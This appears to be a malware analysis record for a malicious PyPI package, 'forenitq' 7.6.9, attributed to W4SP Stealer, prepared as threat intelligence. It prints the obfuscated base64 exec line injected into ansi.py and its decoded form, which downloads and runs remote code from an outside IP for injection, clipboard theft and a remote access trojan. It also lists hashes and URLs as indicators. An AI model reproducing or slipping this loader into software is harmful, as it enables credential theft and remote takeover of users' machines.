PYTHON MALWARE

MALWARE ATTRIBUTION: W4SP STEALER

PACKAGE NAME: FORENITQ
VERSION: 7.6.9

INFECTED FILE: forenitq-7.6.9/forenitq/ansi.py

INFECTED CODE:
LINE: 59
print('\n');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbignaHR0cDovLzIwLjIyNi4xOC4yMDMvaW5qZWN0L3RDeEZMWUxUNlZpWTlablAnKS5yZWFkKCkpIiIiKQ0KX3R0bXAuY2xvc2UoKQ0KX3R0bXAyID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wMi53cml0ZShiIiIiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly8yMC4yMjYuMTguMjAzL2NsaXAnKS5yZWFkKCkpIiIiKQ0KX3R0bXAyLmNsb3NlKCkNCl90dG1wMyA9IF9mZmlsZShkZWxldGU9RmFsc2UpDQpfdHRtcDMud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjI2LjE4LjIwMy9yYXQnKS5yZWFkKCkpIiIiKQ0KX3R0bXAzLmNsb3NlKCkNCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikNCmV4Y2VwdDogcGFzcw0KdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAyLm5hbWV9IikNCmV4Y2VwdDogcGFzcw0KdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAzLm5hbWV9IikNCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))

DECODED:
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://20.226.18.203/inject/tCxFLYLT6ViY9ZnP').read())""")
_ttmp.close()
_ttmp2 = _ffile(delete=False)
_ttmp2.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://20.226.18.203/clip').read())""")
_ttmp2.close()
_ttmp3 = _ffile(delete=False)
_ttmp3.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://20.226.18.203/rat').read())""")
_ttmp3.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp2.name}")
except: pass
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp3.name}")
except: pass



PYTHON FILE HASH
FILENAME: ansi.py
md5: 714AAC4C02D7567DA8D98698264801C8
sha1: 797A0FBA6857B310B401F4AF3B599B46D930D5C5
sha256: FE31CBD19908CDBF8DF2720E8F0E383B2035AF8DE8F9E0BA3AB126815CCBA939



DOWNLOAD IP
20.226.18.203

DOWNLOAD URLS
http://20.226.18.203/inject/tCxFLYLT6ViY9ZnP
http://20.226.18.203/clip
http://20.226.18.203/rat





REFERENCES:
https://blog.polyswarm.io/w4sp-infostealer
https://www.bleepingcomputer.com/news/security/hackers-bombard-pypi-platform-with-information-stealing-malware/
